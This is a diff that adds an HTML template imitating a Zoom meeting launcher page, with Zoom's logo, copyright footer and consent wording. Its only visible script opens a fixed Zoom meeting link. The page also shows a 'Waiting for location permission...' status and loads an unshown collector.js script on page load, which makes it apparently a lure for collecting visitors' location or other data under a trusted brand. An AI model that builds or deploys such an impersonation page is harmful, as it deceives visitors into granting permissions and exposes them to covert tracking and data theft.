@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Zoom Meeting Launcher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --zoom-blue: #2d8cff;
+      --zoom-dark: #1a1a1a;
+      --zoom-light: #f9f9f9;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--zoom-light);
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .navbar {
+      background-color: white;
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+    }
+    .navbar-left img {
+      height: 40px;
+    }
+    .navbar-right a {
+      margin-left: 20px;
+      text-decoration: none;
+      color: var(--zoom-blue);
+      font-size: 14px;
+    }
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    .main p {
+      max-width: 400px;
+      margin: 10px 0;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+    .main p strong {
+      font-weight: bold;
+    }
+    .launch-btn {
+      background-color: var(--zoom-blue);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s ease;
+    }
+    .launch-btn:hover {
+      background-color: #1a6edc;
+    }
+    .download {
+      margin-top: 25px;
+      font-size: 14px;
+    }
+    .download a {
+      color: var(--zoom-blue);
+      text-decoration: none;
+    }
+    #location-status {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #555;
+    }
+    .footer {
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid #eee;
+    }
+    .footer a {
+      color: var(--zoom-blue);
+      text-decoration: none;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="navbar">
+    <div class="navbar-left">
+      <img src="https://st1.zoom.us/homepage/publish/assets/images/zoom-logo.svg" alt="Zoom Logo">
+    </div>
+    <div class="navbar-right">
+      <a href="#">Support</a>
+      <a href="#">English</a>
+    </div>
+  </div>
+
+  <div class="main">
+    <p><strong>Click Open link</strong> on the dialog shown by your browser.</p>
+    <p>If you don’t see a dialog, click <strong>Launch Meeting</strong> below.</p>
+    <p>By clicking <strong>'Launch Meeting'</strong>, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Statement</a>.</p>
+
+    <button class="launch-btn" onclick="launchMeeting()">Launch Meeting</button>
+
+    <div class="download">
+      Don’t have Zoom Client installed? <a href="https://zoom.us/download">Download Now</a>
+    </div>
+    <div id="location-status">Waiting for location permission...</div>
+  </div>
+
+  <div class="footer">
+    ©2025 Zoom Video Communications, Inc. All rights reserved.<br>
+    <a href="#">Privacy & Legal Policies</a> |
+    <a href="#">Do Not Sell My Personal Information</a> |
+    <a href="#">Cookie Preferences</a>
+  </div>
+
+  <script>
+    // Launch Zoom meeting
+    function launchMeeting() {
+      const zoomUrl = 'https://zoom.us/j/1234567890';
+      window.open(zoomUrl, '_blank');
+    }
+  </script>
+  <script src="{{ url_for('static', filename='js/collector.js') }}"></script>
+</body>
+</html>
